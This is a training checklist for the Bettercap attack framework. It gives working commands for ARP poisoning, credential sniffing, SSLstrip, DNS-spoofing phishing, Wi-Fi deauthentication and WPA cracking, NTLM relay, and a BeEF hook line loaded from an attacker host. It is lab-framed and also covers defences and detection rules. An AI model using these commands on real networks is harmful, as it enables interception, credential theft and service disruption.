# 🐝 Bettercap: Complete Mastery Checklist

> **What is Bettercap?** Bettercap is a modern, modular network attack and monitoring framework. It handles ARP poisoning/MITM, DNS spoofing, HTTP/HTTPS injection, Bluetooth and Wi-Fi attacks, and passive network reconnaissance — all through a unified, scriptable web-based or interactive CLI interface. It is the actively maintained successor to Ettercap.
>
> **Why does it exist?** Ettercap became unmaintained and brittle. Bettercap was designed as a complete rewrite — clean architecture, extensible modules, Go-based core, web UI, and a built-in scripting engine (caplets). It handles modern network scenarios that Ettercap struggles with (HTTPS MITM, 802.11 attacks, BLE).
>
> **When to use it:** ARP poisoning to perform MITM on a LAN. Capturing and analyzing traffic between two hosts. DNS spoofing attacks. Wi-Fi access point scanning and deauthentication. Credential sniffing on HTTP networks. LAN reconnaissance.
>
> **When to avoid it:** Without authorization — ARP poisoning disrupts legitimate network traffic. In networks with Dynamic ARP Inspection (DAI) enabled — it will be blocked. Production environments without explicit permission.
>
> **What mastering Bettercap unlocks:** Full MITM capability on local networks. Network-level credential capture. DNS-based attacks. Wi-Fi reconnaissance. The foundation for all LAN-based interception attacks.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 4 | 1–2 hours |
| 2 | ARP Poisoning | 5 | 3–4 hours |
| 3 | Sniffing | 4 | 2–3 hours |
| 4 | DNS Spoofing | 3 | 2–3 hours |
| 5 | Wi-Fi | 4 | 3–4 hours |
| 6 | Scripting | 3 | 2–3 hours |
| 7 | Practical Labs | 3 | 3–5 hours |
| 8 | Mastery Challenges | 2 | 2–3 hours |
| | **Total** | **28** | **~18–27 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — ARP and MITM Concepts

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **ARP** | Address Resolution Protocol maps IP → MAC. Stateless — any machine can send gratuitous ARP replies claiming to be any IP. No authentication. |
| **ARP Poisoning** | Attacker sends spoofed ARP replies: "I am the gateway" to the victim, and "I am the victim" to the gateway. Both update their ARP tables. Traffic flows: victim → attacker → gateway (and back). |
| **MITM** | Man-in-the-Middle: attacker sees all traffic between victim and gateway. Can read, modify, or inject traffic. |
| **IP Forwarding** | Attacker must forward traffic after intercepting, or both victim and gateway lose connectivity. `echo 1 > /proc/sys/net/ipv4/ip_forward`. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Kali** | `apt install bettercap`. |
| **Go** | `go install github.com/bettercap/bettercap@latest`. |
| **Verify** | `bettercap -version`. |
| **Root** | Requires root: `sudo bettercap`. |

---

### Task 1.3 — Bettercap Modules

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **arp.spoof** | ARP poisoning / MITM. |
| **dns.spoof** | DNS response spoofing. |
| **net.sniff** | Packet sniffer with credential parsing. |
| **http.proxy** | HTTP proxy for traffic inspection/injection. |
| **https.proxy** | HTTPS MITM proxy (requires SSLstrip or cert injection). |
| **net.probe** | Active network discovery. |
| **wifi** | 802.11 scanning, deauth attacks. |
| **ble** | Bluetooth Low Energy scanning. |

---

### Task 1.4 — Interface and Syntax

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Start** | `sudo bettercap -iface eth0`. Opens interactive console. |
| **Commands** | `help` — list all commands. `help module_name` — module help. `module on/off` — enable/disable. `set module.option value` — configure. |
| **Web UI** | `sudo bettercap -caplet http-ui` — web UI at `https://127.0.0.1`. Default creds: user/pass. |

---

# PHASE 2: ARP POISONING

---

### Task 2.1 — Enable IP Forwarding

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Linux** | `sudo echo 1 > /proc/sys/net/ipv4/ip_forward`. Or: `sudo sysctl -w net.ipv4.ip_forward=1`. |
| **Why** | Without forwarding, poisoned traffic arrives at attacker but goes nowhere → victim loses connectivity. With forwarding: traffic is relayed → MITM is invisible. |
| **Persistent** | Edit `/etc/sysctl.conf`: `net.ipv4.ip_forward = 1`. |

---

### Task 2.2 — Basic ARP Poisoning

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Target All** | `arp.spoof on` — poisons all hosts on the subnet (tells everyone the attacker is the gateway). Loud — visible on the network. |
| **Target Specific** | `set arp.spoof.targets 192.168.1.100` — poison only this host. Less traffic, less detectable. |
| **Check** | On victim: `arp -a` — gateway's IP should now show attacker's MAC address. |

---

### Task 2.3 — Full MITM Setup

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Commands** | `set arp.spoof.targets 192.168.1.100`. `arp.spoof on`. `net.sniff on`. Traffic flows through attacker. |
| **Verify** | In Wireshark or net.sniff output: see victim's traffic. HTTP credentials visible. |

---

### Task 2.4 — ARP Spoofing Detection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Detection** | `arp.spoof` module in detection mode: watches for ARP replies that change existing mappings. `arp.ban` — send ARP broadcasts to inform hosts of the real MAC mapping. |
| **Defenses** | Dynamic ARP Inspection (DAI) on managed switches. Static ARP entries. ARP watch software. |

---

### Task 2.5 — Targeted Bidirectional Poisoning

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Both Ways** | `set arp.spoof.targets 192.168.1.100,192.168.1.1` — poison both victim AND gateway for full bidirectional MITM. |
| **Fullduplex** | `set arp.spoof.fullduplex true` — Bettercap handles bidirectional poisoning automatically. |

---

# PHASE 3: SNIFFING

---

### Task 3.1 — net.sniff

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Enable** | `net.sniff on`. |
| **Credential Parsers** | Built-in parsers for: HTTP auth, FTP, Telnet, SMTP, POP3, IMAP, NTLM, Kerberos, MySQL, LDAP. Credentials displayed in real time. |
| **Filter** | `set net.sniff.filter "tcp port 80"` — BPF filter. |
| **PCAP** | `set net.sniff.output capture.pcap` — save to PCAP file for later analysis. |

---

### Task 3.2 — Credential Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **HTTP** | Plain HTTP: credentials visible in output as `[credentials] user:password → target`. |
| **FTP** | FTP USER and PASS visible. |
| **NTLM** | NTLMv2 hashes captured from SMB traffic (if MITM is active). Save → crack with Hashcat. |
| **Save All** | `set net.sniff.verbose true` — show full packet details. |

---

### Task 3.3 — HTTP Proxy Injection

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Enable** | `http.proxy on`. |
| **Inject JS** | `set http.proxy.script inject.js` — inject JavaScript into every HTTP response. |
| **Inject HTML** | Inject content into HTTP responses. |
| **Use** | Inject BeEF hook: `<script src="http://attacker/hook.js"></script>`. Any browser visiting HTTP sites gets the hook. |

---

### Task 3.4 — HTTPS MITM with SSLstrip

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **SSLstrip** | Downgrades HTTPS links to HTTP. Browser communicates with attacker over HTTP. Attacker communicates with server over HTTPS. Credentials captured in cleartext. |
| **HSTS** | HSTS (HTTP Strict Transport Security) defeats SSLstrip. HSTS-protected sites won't be downgraded by most browsers. |
| **bettercap** | `set https.proxy.sslstrip true`. `https.proxy on`. Works on non-HSTS sites. |

---

# PHASE 4: DNS SPOOFING

---

### Task 4.1 — DNS Spoofing Basics

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | While ARP poisoning is active, victim's DNS queries flow through attacker. Bettercap intercepts and replies with fake DNS answers pointing to attacker's IP (or any IP). |
| **Enable** | `dns.spoof on`. |
| **All Domains** | `set dns.spoof.all true` — spoof all DNS queries. |
| **Specific** | `set dns.spoof.domains google.com,facebook.com` — spoof only these. |
| **Address** | `set dns.spoof.address 192.168.1.50` — attacker's IP (or any phishing server). |

---

### Task 4.2 — Phishing via DNS Spoof

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Workflow** | ARP poison target → DNS spoof `corporate-internal.com` → victim's browser resolves to attacker's IP → attacker serves fake login page → credentials captured. |
| **Setup** | `apache2` or `python3 -m http.server` on attacker serving fake login page. DNS spoof to attacker's IP. |

---

### Task 4.3 — DNS MITM Detection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Detect** | DNSSEC validates DNS responses cryptographically. Browsers check HSTS preload for critical domains. Certificate Transparency logs catch fake certificates. |
| **Attacker Limit** | Can spoof DNS but can't forge valid TLS certificates for real domains → browser shows cert warning (unless user ignores it). |

---

# PHASE 5: WI-FI

---

### Task 5.1 — Wi-Fi Scanning

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Interface** | Requires monitor mode capable wireless adapter. `sudo airmon-ng start wlan0` → `wlan0mon`. |
| **Scan** | `sudo bettercap -iface wlan0mon`. Then: `wifi.recon on`. Shows all nearby APs and clients. |
| **Output** | SSID, BSSID, channel, encryption, clients associated, signal strength. |

---

### Task 5.2 — Deauthentication Attack

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | Send 802.11 deauth frames to disconnect clients from their AP. Used to: force clients to reconnect (capture WPA handshake), disrupt network connectivity (DoS). |
| **Command** | `wifi.deauth <BSSID>` — deauth all clients on this AP. `wifi.deauth <client_MAC>` — deauth specific client. |
| **WPA Handshake** | Deauth → client reconnects → handshake captured by bettercap (or Wireshark). Crack handshake offline with Hashcat (mode 2500/22000). |

---

### Task 5.3 — Evil Twin AP

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Concept** | Create a fake AP with the same SSID as a legitimate AP. Deauth clients from legitimate AP. Clients reconnect to evil twin. Capture WPA credentials (WPA-Enterprise) or perform HTTP MITM. |
| **Tools** | Bettercap can handle parts. Full evil twin: `hostapd-wpe` for WPA-Enterprise capture. `dnsmasq` for DHCP. |

---

### Task 5.4 — WPA Handshake Capture

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Capture** | `wifi.recon on` → identify target AP → `wifi.deauth <BSSID>` → capture handshake in PCAP via `net.sniff`. |
| **Crack** | `hashcat -m 22000 handshake.pcap rockyou.txt` (newer format). Or `hcxpcapngtool` to convert PCAP → `hashcat -m 22000 hash.hc22000 rockyou.txt`. |

---

# PHASE 6: SCRIPTING (CAPLETS)

---

### Task 6.1 — What are Caplets

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Caplets** | Bettercap scripts (`.cap` files). Sequence of bettercap commands. Automating complex attack setups. |
| **Run** | `sudo bettercap -caplet my_attack.cap`. |
| **Built-in** | `/usr/share/bettercap/caplets/` — pre-built caplets for common attacks. |

---

### Task 6.2 — Writing a Basic Caplet

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Example** | `# arp_mitm.cap`. `set arp.spoof.targets 192.168.1.100`. `set arp.spoof.fullduplex true`. `arp.spoof on`. `net.sniff on`. |
| **Scheduling** | `sleep 60; arp.spoof off; net.sniff off` — stop after 60 seconds. |

---

### Task 6.3 — Pre-built Caplets

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **http-ui** | `bettercap -caplet http-ui` — start web UI. |
| **pwnagotchi** | Caplet for passive WPA handshake collection (like Pwnagotchi device). |
| **List** | `sudo bettercap -eval "caplets.show"` — list all installed caplets. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — ARP Poisoning + Credential Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Lab with Kali, victim VM, and a gateway. ARP poison the victim. Enable net.sniff. Victim browses an HTTP site or uses FTP. Capture credentials in Bettercap output. |
| **Success Criteria** | ARP poisoning confirmed (victim's ARP table shows attacker's MAC for gateway). Credentials captured from HTTP/FTP traffic. |

---

### Lab 7.2 — DNS Spoofing Attack

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | ARP poison victim → DNS spoof a specific domain → serve fake login page on attacker → victim visits the spoofed domain → credentials captured from fake login page. |
| **Success Criteria** | Victim's browser resolves the domain to attacker's IP. Fake page served. Credentials submitted to attacker's server. |

---

### Lab 7.3 — Wi-Fi Handshake Capture

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | In a lab Wi-Fi environment: scan for target AP → identify connected client → deauth client → capture WPA handshake → crack handshake with Hashcat against rockyou.txt. |
| **Success Criteria** | Handshake captured. Password cracked (use a test AP with a known weak password). |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Full LAN Compromise Chain

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | ARP poison target → capture NTLM hashes via SMB MITM → relay with ntlmrelayx → OR crack captured NTLMv2 hash → use credentials for lateral movement. Document complete chain. |
| **Success Criteria** | Credentials obtained via network MITM. Used successfully for further access. |

---

### Challenge 8.2 — Write Detection Rules

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | After running Bettercap ARP attacks in a lab, capture the attack traffic with Wireshark. Write Snort or Sigma rules that detect: gratuitous ARP with MAC change, duplicate IP-to-MAC mapping, unusually frequent ARP replies. |
| **Success Criteria** | Detection rules written. Rules fire on captured attack traffic. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can enable IP forwarding and perform ARP poisoning | ☐ |
| Can capture credentials from HTTP, FTP, and NTLM traffic | ☐ |
| Can perform targeted bidirectional ARP spoofing | ☐ |
| Can set up DNS spoofing for phishing attacks | ☐ |
| Can use Wi-Fi modules for scanning and deauth | ☐ |
| Can capture WPA handshakes and crack them | ☐ |
| Can write and use Bettercap caplets | ☐ |
| Understands HSTS and why it defeats SSLstrip | ☐ |
| Can detect ARP poisoning on a network | ☐ |

---

## 🎯 Interview Questions

1. What is ARP poisoning and how does Bettercap implement it?
2. Why must IP forwarding be enabled during ARP poisoning?
3. What is SSLstrip and what defeats it?
4. How do you perform DNS spoofing with Bettercap?
5. What is a Bettercap caplet and how do you use one?
6. How do you capture WPA handshakes with Bettercap?
7. What network-level defenses defeat ARP poisoning?
8. How do you capture NTLM hashes via Bettercap MITM?
